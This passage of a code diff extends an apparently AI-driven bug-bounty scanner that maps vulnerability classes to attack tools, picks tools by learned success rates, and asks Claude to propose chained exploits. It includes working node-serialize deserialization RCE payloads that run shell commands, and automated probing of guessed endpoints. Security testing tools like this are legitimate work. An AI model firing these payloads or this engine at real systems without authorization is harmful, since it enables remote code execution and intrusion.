+              parentFindingIds: hypothesis.chainedFrom,
+            });
+          }
           const confirmed = await this.buildConfirmedFinding(hypothesis, successful);
           this.state.confirmedFindings.push(confirmed);
           this.emit("hunt:finding_confirmed", { finding: confirmed });
@@ -1557,6 +1927,12 @@ Return ONLY valid JSON array of hypothesis objects.`;
             payload: confirmed.exploitPayload,
             description: confirmed.hypothesis.reasoning.slice(0, 300),
             confirmedAt: new Date().toISOString(),
+          });
+          contextWriter.alert("finding", {
+            vulnClass: confirmed.hypothesis.vulnClass,
+            severity: confirmed.severity,
+            endpoint: confirmed.hypothesis.targetUrl,
+            confidence: confirmed.hypothesis.confidence,
           });
           await this.persistFinding(confirmed);
           notificationService.notifyIfWorthy({
@@ -1573,7 +1949,7 @@ Return ONLY valid JSON array of hypothesis objects.`;
             (async () => {
               try {
                 const ssrfParam = ssrfChainProber.detectSSRFParam(hypothesis.targetUrl);
-                const pivot = await ssrfChainProber.probe(hypothesis.targetUrl, ssrfParam, this.authHeaders);
+                const pivot = await ssrfChainProber.probe(hypothesis.targetUrl, ssrfParam, this.authHeaders, this.state.programId);
                 for (const ph of pivot.pivotHypotheses) {
                   this.state.hypotheses.push({
                     id: uuidv4(), vulnClass: ph.vulnClass, targetUrl: hypothesis.targetUrl,
@@ -1644,6 +2020,12 @@ Return ONLY valid JSON array of hypothesis objects.`;
       }
     }
 
+    // Cross-finding synthesis — ask Claude what chained attack is now possible
+    // given all confirmed findings in combination. Async, non-blocking.
+    if (this.state.confirmedFindings.length >= 2) {
+      this.synthesizeChainedAttack().catch(() => {});
+    }
+
     const pending = this.state.hypotheses.filter(h => h.status === "pending").length;
     const rejected = this.state.hypotheses.filter(h => h.status === "rejected").length;
     this.emit("hunt:update", {
@@ -1666,6 +2048,42 @@ Return ONLY valid JSON array of hypothesis objects.`;
       phase: "decision",
       summary: `Iteration ${this.state.iteration} complete. Confirmed: ${this.state.confirmedFindings.length}, Pending: ${pending}, Rejected: ${rejected}.`,
     });
+
+    // Cross-finding synthesis — runs after first confirmed finding
+    await this.runSynthesis();
+  }
+
+  private async runSynthesis(): Promise<void> {
+    if (this.state.confirmedFindings.length < 1) return;
+    try {
+      const discoveredUrls = this.state.observations
+        .map(o => (o as unknown as Record<string, unknown>).url as string)
+        .filter(Boolean);
+      const testedClasses = [...new Set(this.state.hypotheses.map(h => h.vulnClass))];
+      const chains = await synthesisAgent.synthesize(
+        this.state.sessionId,
+        this.state.confirmedFindings,
+        discoveredUrls,
+        testedClasses,
+      );
+      if (chains.length > 0) {
+        const deduped = chains.filter(c =>
+          !this.state.hypotheses.some(
+            h => h.vulnClass === c.vulnClass && h.targetUrl === c.targetUrl
+          )
+        );
+        if (deduped.length > 0) {
+          this.state.hypotheses.push(...deduped as unknown as Hypothesis[]);
+          this.emit("hunt:chain_hypotheses", {
+            sessionId: this.state.sessionId,
+            count: deduped.length,
+            chains: deduped.map(c => ({ vulnClass: c.vulnClass, chainedFrom: c.chainedFrom })),
+          });
+        }
+      }
+    } catch (err) {
+      logger.debug("[HunterEngine] Synthesis skipped (non-fatal)", { err: String(err) });
+    }
   }
 
   // ─── Helpers ─────────────────────────────────────────────────────────────────
@@ -1770,7 +2188,7 @@ Return ONLY valid JSON array of hypothesis objects.`;
     const vulnToolMap: Record<string, string> = {
       xss: "dalfox",
       sqli: "sqlmap",
-      ssrf: "nuclei",
+      ssrf: "ssrfmap",
       lfi: "nuclei",
       rce: "nuclei",
       ssti: "tplmap",
@@ -1783,7 +2201,8 @@ Return ONLY valid JSON array of hypothesis objects.`;
       security_headers: "curl_probe",
       tech_stack: "whatweb",
       open_redirect: "nuclei",
-      cors: "curl_probe",
+      cors: "corsy",
+      nosqli: "nosqlmap",
       csrf: "curl_probe",
       info_disclosure: "curl_probe",
       xxe: "nuclei",
@@ -1806,15 +2225,49 @@ Return ONLY valid JSON array of hypothesis objects.`;
     return vulnToolMap[vulnClass] || "nuclei";
   }
 
+  // Candidate tool sets per vuln class — the realistic options the engine can
+  // pick among. Used by selectToolRL to let learned success rates choose the
+  // best performer rather than always firing the hardcoded default.
+  private static readonly TOOL_CANDIDATES: Record<string, string[]> = {
+    sqli:             ["sqlmap", "nuclei", "curl_probe"],
+    xss:              ["dalfox", "nuclei", "curl_probe"],
+    ssrf:             ["ssrfmap", "nuclei", "curl_probe"],
+    lfi:              ["nuclei", "curl_probe"],
+    rce:              ["nuclei", "curl_probe"],
+    cors:             ["corsy", "curl_probe", "nuclei"],
+    nosqli:           ["nosqlmap", "nuclei"],
+    csrf:             ["curl_probe", "nuclei"],
+    idor:             ["curl_probe", "nuclei"],
+    info_disclosure:  ["curl_probe", "nuclei"],
+    auth_bypass:      ["jwt_tool", "nuclei", "curl_probe"],
+    misconfig:        ["nikto", "nuclei"],
+    xxe:              ["nuclei", "curl_probe"],
+    security_headers: ["curl_probe", "nuclei"],
+    open_redirect:    ["nuclei", "curl_probe"],
+  };
+
+  /**
+   * RL-aware tool selection. Consults learned per-(tool,vulnClass) success rates
+   * to pick the best candidate, falling back to the hardcoded selectTool default
+   * on cold start or when no candidate clearly beats it.
+   */
+  private async selectToolRL(vulnClass: string): Promise<string> {
+    const fallback = this.selectTool(vulnClass);
+    const candidates = HunterEngine.TOOL_CANDIDATES[vulnClass];
+    if (!candidates || candidates.length <= 1) return fallback;
+    return this.rlWiring.getBestTool(candidates, vulnClass, fallback);
+  }
+
   private getAlternateTool(hypothesis: Hypothesis): string {
     // Rotation per vuln class — each entry is an ordered list of tool alternatives
     const TOOL_ROTATION: Record<string, string[]> = {
       sqli:             ["sqlmap", "nuclei", "curl_probe"],
       xss:              ["nuclei", "curl_probe"],
-      ssrf:             ["nuclei", "curl_probe"],
+      ssrf:             ["ssrfmap", "nuclei", "curl_probe"],
       lfi:              ["nuclei", "curl_probe"],
       rce:              ["nuclei", "curl_probe"],
-      cors:             ["curl_probe", "nuclei"],
+      cors:             ["corsy", "curl_probe", "nuclei"],
+      nosqli:           ["nosqlmap", "nuclei"],
       csrf:             ["curl_probe", "nuclei"],
       idor:             ["curl_probe", "nuclei"],
       info_disclosure:  ["curl_probe", "nuclei"],
@@ -1856,6 +2309,27 @@ Return ONLY valid JSON array of hypothesis objects.`;
         case "nikto":
           if (key.toLowerCase() === "cookie") {
             args.push("-c", value);
+          }
+          break;
+        case "corsy":
+          // corsy parses --headers as JSON
+          args.push("--headers", JSON.stringify({ [key]: value }));
+          break;
+        case "jwt_tool":
+          args.push("-rh", `${key}: ${value}`);
+          break;
+        case "xsser":
+          args.push("--headers", `${key}: ${value}`);
+          break;
+        case "ssrfmap":
+          // -H passes a custom header; --uagent was wrong (ignored key/value entirely)
+          args.push("-H", `${key}: ${value}`);
+          break;
+        case "nosqlmap":
+          if (key.toLowerCase() === "cookie") {
+            args.push("--cookie", value);
+          } else {
+            args.push("--header", `${key}: ${value}`);
           }
           break;
       }
@@ -1904,6 +2378,105 @@ Return ONLY valid JSON array of hypothesis objects.`;
     } catch (err) {
       logger.debug("[HunterEngine] OOB probe error (non-critical)", { err: String(err) });
       return false;
+    }
+  }
+
+  private async probeDeserialize(baseUrl: string): Promise<{
+    found: boolean; output: string; endpoint: string; flagValues: string[]; duration: number;
+  }> {
+    const start = Date.now();
+    const allObs = this.state.observations.map(o => (o as unknown as Record<string, string>).rawOutput || "").join(" ");
+
+    // Discover deserialize endpoints from observations or infer from base URL
+    const endpoints: string[] = [];
+    const endpointPatterns = ["/deserializ", "/serial", "/unserializ", "/pickle", "/marshal", "/object"];
+    for (const pat of endpointPatterns) {
+      const match = allObs.match(new RegExp(`(["'/])((?:[^"'/\\s]*)?${pat.slice(1)}[^"'\\s]*)`, "i"));
+      if (match) {
+        try { endpoints.push(new URL(match[2], baseUrl).toString()); } catch { /* skip */ }
+      }
+    }
+    // Also try base URL itself and common paths
+    try {
+      const origin = new URL(baseUrl).origin;
+      endpoints.push(...["/deserialize", "/api/deserialize", "/parse", "/api/parse"].map(p => origin + p));
+    } catch { /* noop */ }
+
+    const payloads = [
+      // node-serialize IIFE
+      `{"rce":"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString()}()"}`,
+      // process.mainModule variant
+      `{"x":"_$$ND_FUNC$$_function(){return process.mainModule.require('child_process').execSync('id').toString()}()"}`,
+    ];
+
+    const FLAG_RE = /flag\{[^}]+\}|\b[0-9a-f]{32}\b/g;
+
+    for (const endpoint of [...new Set(endpoints)]) {
+      for (const payload of payloads) {
+        try {
+          const resp = await axios.post(endpoint, payload, {
+            headers: { "Content-Type": "application/json", ...this.authHeaders },
+            timeout: 8000,
+            validateStatus: () => true,
+          });
+          const body = String(typeof resp.data === "string" ? resp.data : JSON.stringify(resp.data));
+          const flags = body.match(FLAG_RE) ?? [];
+          const rceHit = /uid=\d+|root|executed|flag\{/i.test(body);
+          if (flags.length > 0 || rceHit) {
+            return { found: true, output: body.slice(0, 600), endpoint, flagValues: flags, duration: Date.now() - start };
+          }
+        } catch { /* try next */ }
+      }
+    }
+
+    return { found: false, output: "", endpoint: "", flagValues: [], duration: Date.now() - start };
+  }
+
+  private async runVisionObservation(): Promise<void> {
+    try {
+      // Take a lightweight screenshot via playwright-worker if it's available
+      const { chromium } = await import('playwright');
+      const browser = await chromium.launch({ args: ['--no-sandbox', '--disable-setuid-sandbox'] });
+      const page = await browser.newPage();
+      await page.goto(this.state.targetUrl, { timeout: 10000, waitUntil: 'domcontentloaded' });
+      const screenshotBuffer = await page.screenshot({ type: 'png', fullPage: false });
+      await browser.close();
+      const base64 = screenshotBuffer.toString('base64');
+
+      const visionPrompt =
+        `You are a security researcher performing reconnaissance on a web application. ` +
+        `Analyze this screenshot of the target homepage at ${this.state.targetUrl}. ` +
+        `Identify and list: login forms, file upload areas, search fields, admin/dashboard links, ` +
+        `API endpoints mentioned, user roles visible, any unusual UI elements. ` +
+        `Output as a concise bullet list of attack surface observations only.`;
+
+      const description = await this.modelRouter.describeScreenshot(base64, visionPrompt);
+      if (!description) return;
+
+      // Extract tags from vision description
+      const tags: string[] = ['vision', 'ui_analysis'];
+      if (/login|auth|password|sign.?in/i.test(description))   tags.push('auth');
+      if (/upload|file|attachment/i.test(description))          tags.push('file_upload');
+      if (/admin|dashboard|panel/i.test(description))           tags.push('admin_panel');
+      if (/search|query|filter/i.test(description))             tags.push('sqli', 'xss');
+      if (/api|endpoint|rest|graphql/i.test(description))       tags.push('api_surface');
+      if (/register|signup|create.account/i.test(description))  tags.push('idor');
+
+      const visionObs: Observation = {
+        id: uuidv4(),
+        timestamp: Date.now(),
+        source: 'vision_model',
+        data: { description },
+        anomalyScore: 0.3,
+        tags,
+        rawOutput: description,
+      } as unknown as Observation;
+
+      this.state.observations.push(visionObs);
+      this.emit('hunt:observations', { count: 1, observations: [visionObs] });
+      logger.info('[HunterEngine] Vision observation added', { tags, preview: description.slice(0, 120) });
+    } catch (err) {
+      logger.debug('[HunterEngine] Vision observation skipped', { reason: String(err).slice(0, 100) });
     }
   }
 
@@ -1986,6 +2559,8 @@ Return ONLY valid JSON array of hypothesis objects.`;
       severity,
       cvssScore,
       exploitPayload: bestProbe?.output?.slice(0, 500) || "",
+      rawEvidence: bestProbe?.rawHttpLog ?? undefined,
+      videoPath: bestProbe?.videoPath ?? undefined,
     };
   }
 
@@ -2024,9 +2599,14 @@ Return ONLY valid JSON array of hypothesis objects.`;
         confidence: confirmed.hypothesis.confidence,
         cvssScore: confirmed.cvssScore,
         description: confirmed.hypothesis.reasoning,
-        evidence: confirmed.proof as unknown as Record<string, unknown>[],
+        evidence: [
+          ...confirmed.proof as unknown as Record<string, unknown>[],
+          ...(confirmed.rawEvidence ? [{ type: "raw_http", data: confirmed.rawEvidence }] : []),
+          ...(confirmed.videoPath ? [{ type: "video_poc", path: confirmed.videoPath }] : []),
+        ],
         reproductionSteps: this.buildReproductionSteps(confirmed) as unknown as Record<string, unknown>[],
         exploitPayload: confirmed.exploitPayload,
+        affectedUrl: confirmed.hypothesis.targetUrl,
         verificationStatus: "pending",
         status: "new",
       });
@@ -2086,6 +2666,87 @@ Return ONLY valid JSON array of hypothesis objects.`;
       }
     } catch (err) {
       logger.error("Failed to persist hunt results", { err });
+    }
+  }
+
+  /** Cross-finding synthesis: given all confirmed findings, ask Claude what
+   *  chained exploit is now possible that wasn't before. Seeds new hypotheses. */
+  private lastSynthesisCount = 0;
+  private async synthesizeChainedAttack(): Promise<void> {
+    const findings = this.state.confirmedFindings;
+    if (findings.length <= this.lastSynthesisCount) return;
+    this.lastSynthesisCount = findings.length;
+
+    const summary = findings.map(f => ({
+      vulnClass: f.hypothesis.vulnClass,
+      severity:  f.severity,
+      url:       f.hypothesis.targetUrl,
+      payload:   f.exploitPayload.slice(0, 100),
+      reasoning: f.hypothesis.reasoning.slice(0, 200),
+    }));
+
+    const prompt = `You are reviewing confirmed vulnerabilities from an authorized bug bounty hunt on ${this.state.targetUrl}.
+
+Confirmed findings:
+${JSON.stringify(summary, null, 2)}
+
+Answer in JSON only:
+{
+  "chains": [{
+    "name": "short chain name",
+    "steps": ["finding A → finding B"],
+    "combined_impact": "what attacker achieves",
+    "severity": "critical|high|medium",
+    "next_hypothesis": { "vulnClass": "string", "targetUrl": "string", "reasoning": "string" } | null
+  }],
+  "key_insight": "one-sentence most important cross-finding relationship"
+}
+
+Only include chains that genuinely increase severity beyond individual findings.`;
+
+    try {
+      const { ClaudeClient } = await import("./LogicExploitAgent").then(() =>
+        import("../lib/claude-client")
+      );
+      const raw = await ClaudeClient.oneShot(
+        "You are an expert security analyst. Return only valid JSON.",
+        prompt,
+        this.state.sessionId
+      );
+      const jsonMatch = raw.match(/\{[\s\S]*\}/);
+      if (!jsonMatch) return;
+      const parsed = JSON.parse(jsonMatch[0]) as {
+        chains: Array<{ name: string; steps: string[]; combined_impact: string; severity: string; next_hypothesis: { vulnClass: string; targetUrl: string; reasoning: string } | null }>;
+        key_insight: string;
+      };
+      if (!parsed?.chains?.length) return;
+
+      this.emit("hunt:chain_synthesized", {
+        sessionId: this.state.sessionId,
+        chains: parsed.chains.map(c => ({ name: c.name, steps: c.steps, impact: c.combined_impact, severity: c.severity })),
+        insight: parsed.key_insight,
+      });
+      logger.info("[HunterEngine] Chain synthesis", { chains: parsed.chains.length, insight: parsed.key_insight?.slice(0, 120) });
+
+      // Seed the best next hypothesis from the highest-severity chain
+      for (const chain of parsed.chains) {
+        if (chain.next_hypothesis && (chain.severity === "critical" || chain.severity === "high")) {
+          const nh = chain.next_hypothesis;
+          if (!this.state.hypotheses.some(h => h.vulnClass === nh.vulnClass && h.targetUrl === nh.targetUrl)) {
+            this.state.hypotheses.push({
+              id: uuidv4(), vulnClass: nh.vulnClass, targetUrl: nh.targetUrl,
+              reasoning: `[Chain synthesis] ${chain.name}: ${nh.reasoning}`,
+              confidence: 0.72, priority: 9,
+              evidence: [], status: "pending", createdAt: Date.now(),
+              chainedFrom: findings.map(f => f.hypothesis.id),
+            });
+            logger.info("[HunterEngine] Synthesis seeded hypothesis", { vulnClass: nh.vulnClass, chain: chain.name });
+          }
+          break;
+        }
+      }
+    } catch (err) {
+      logger.debug("[HunterEngine] Chain synthesis non-fatal", { err: String(err) });
     }
   }
 
